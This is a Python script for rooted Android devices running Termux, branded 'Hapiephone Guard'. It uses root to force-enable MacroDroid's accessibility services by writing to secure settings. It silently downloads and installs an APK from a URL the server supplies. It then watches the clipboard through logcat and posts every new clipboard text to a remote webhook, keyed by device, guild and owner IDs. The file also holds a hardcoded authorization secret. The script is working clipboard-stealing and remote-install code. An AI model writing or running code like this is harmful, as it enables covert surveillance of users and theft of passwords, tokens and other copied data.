import sys
import time
import subprocess
import requests
import os

# --- CONFIGURAÇÕES INICIAIS ---
if len(sys.argv) < 4:
    print(f"❌ [FATAL ERROR] Insufficient arguments to start! Received: {sys.argv}", flush=True)
    sys.exit(1)

DEVICE_ID = sys.argv[1]
GUILD_ID = sys.argv[2]
OWNER_ID = sys.argv[3]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
HEADERS = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
APP_PACKAGE = "com.arlosoft.macrodroid"

# Garante que o Termux não durma
subprocess.run("termux-wake-lock", shell=True, check=False)

def is_app_installed():
    try:
        res = subprocess.check_output(f'su -c "dumpsys package {APP_PACKAGE} | grep versionName"', shell=True, text=True).strip()
        return "versionName" in res
    except Exception:
        return False

def setup_macrodroid():
    print("⚙️ [SETUP] Força Bruta no Banco de Dados de Acessibilidade...", flush=True)
    
    # Strings exatas dos serviços
    service_main = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.MacroDroidAccessibilityService"
    service_ui = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.triggers.services.UIInteractionService"
    macrodroid_services = f"{service_main}:{service_ui}"

    # ETAPA 1: Burlar restrições e ACORDAR o aplicativo
    subprocess.run('su -c "appops set com.arlosoft.macrodroid ACCESS_RESTRICTED_SETTINGS allow"', shell=True, stderr=subprocess.DEVNULL)
    
    print("🔄 [SETUP] Inicializando o app para o Android validar o serviço...", flush=True)
    subprocess.run('su -c "monkey -p com.arlosoft.macrodroid -c android.intent.category.LAUNCHER 1"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2.0) # Pausa vital para o app carregar na memória

    # ETAPA 2: Aplicar permissões básicas
    commands_perms = [
        'su -c "pm grant com.arlosoft.macrodroid android.permission.WRITE_EXTERNAL_STORAGE"',
        'su -c "pm grant com.arlosoft.macrodroid android.permission.READ_EXTERNAL_STORAGE"',
        'su -c "appops set com.arlosoft.macrodroid SYSTEM_ALERT_WINDOW allow"',
        'su -c "dumpsys deviceidle whitelist +com.arlosoft.macrodroid"'
    ]
    for cmd in commands_perms:
        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
    
    # ETAPA 3: Injeção direta no banco de dados (sem ler o estado anterior)
    try:
        # Ativa a acessibilidade global primeiro
        subprocess.run("su -c 'settings put secure accessibility_enabled 1'", shell=True)
        time.sleep(0.5)
        
        # Injeta apenas os serviços do MacroDroid cravados com aspas simples por fora
        cmd_inject = f"su -c 'settings put secure enabled_accessibility_services {macrodroid_services}'"
        subprocess.run(cmd_inject, shell=True)
        time.sleep(0.5)
        
        # DEBUG: Lê o que o Android efetivamente salvou
        check_db = subprocess.check_output("su -c 'settings get secure enabled_accessibility_services'", shell=True, text=True).strip()
        print(f"🔎 [DEBUG BANCO DE DADOS] Atual: {check_db}", flush=True)
        
    except Exception as e:
        print(f"❌ Erro ao forçar acessibilidade: {e}", flush=True)

    print("✅ [SETUP] Injeção concluída. Verifique a tela do celular agora.", flush=True)

def download_and_install(url):
    apk_path = "/sdcard/sys_app_temp.apk"
    try:
        print(f"🔗 [DOWNLOAD] Received link: {url}", flush=True)
        
        if "drive.google.com" in url or "docs.google.com" in url:
            print("⚠️ [WARNING] Google Drive link detected. Using gdown bypass...", flush=True)
            res_dl = subprocess.run(f'gdown "{url}" -O {apk_path}', shell=True)
            
            if res_dl.returncode != 0:
                print("❌ [ERROR] gdown failed. Make sure it is installed: pip install gdown", flush=True)
                return False
        else:
            response = requests.get(url, stream=True, timeout=60)
            response.raise_for_status()
            with open(apk_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk: 
                        f.write(chunk)
        
        if not os.path.exists(apk_path):
             print("❌ [ERROR] File was not created.", flush=True)
             return False

        size_mb = os.path.getsize(apk_path) / (1024 * 1024)
        print(f"📦 [DOWNLOAD] File saved. Size: {size_mb:.2f} MB", flush=True)
        
        if size_mb < 2.0:
            print("⚠️ [WARNING] File is too small. Download blocked.", flush=True)
            os.remove(apk_path)
            return False

        print("⚙️ [INSTALL] Starting silent installation...", flush=True)
        res = subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
        
        if os.path.exists(apk_path):
            os.remove(apk_path)
            
        return "Success" in res.stdout
    except Exception as e:
        print(f"❌ [INTERNAL INSTALL ERROR] {e}", flush=True)
        if os.path.exists(apk_path):
            os.remove(apk_path)
        return False

def force_focus_and_read():
    try:
        subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity" 2>/dev/null', shell=True)
        time.sleep(0.4)
        text = subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        subprocess.run('su -c "input keyevent 4" 2>/dev/null', shell=True)
        return text if text and text != "null" else ""
    except Exception:
        return ""

def check_authorization():
    try:
        installed = is_app_installed()
        
        payload = {
            "ping": True,
            "device_id": DEVICE_ID,
            "guild_id": GUILD_ID,
            "owner_id": OWNER_ID,
            "app_system": not installed,
            "report": {
                "system_info": {
                    "model": "Hapiephone Guard",
                    "root_access": True,
                    "device_id": DEVICE_ID
                }
            }
        }
        response = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            if not installed:
                if "system_apk_url" in data:
                    if download_and_install(data["system_apk_url"]):
                        setup_macrodroid()
                        installed = True
            else:
                setup_macrodroid()
                    
            return data.get("status") == "active" and installed
        return False
    except Exception:
        return False

def start_vigilante():
    print(f"👁️ [WATCHER] Monitorando Guild: {GUILD_ID}...", flush=True)
    last_clip = force_focus_and_read()
    
    subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
    cmd_watcher = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
    process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    while True:
        line = process.stdout.readline()
        if line:
            time.sleep(0.5)
            current = force_focus_and_read()
            
            if current and current != last_clip:
                if not is_app_installed():
                    process.terminate()
                    return

                try:
                    payload = {
                        "texto": current, 
                        "device_id": DEVICE_ID, 
                        "guild_id": GUILD_ID,
                        "owner_id": OWNER_ID
                    }
                    res = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=5)
                    
                    if res.status_code == 200:
                        data = res.json()
                        if data.get("status") == "shutdown":
                            process.terminate()
                            return
                            
                    last_clip = current
                except Exception:
                    process.terminate()
                    return

        if process.poll() is not None:
            process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def main():
    print("📡 Hapiephone System Online...", flush=True)
    
    if is_app_installed():
        setup_macrodroid()

    while True:
        if check_authorization():
            start_vigilante()
        else:
            print("😴 [WAITING] Re-autorizando em 5 min...", flush=True)
            time.sleep(300) 

if __name__ == "__main__":
    main()
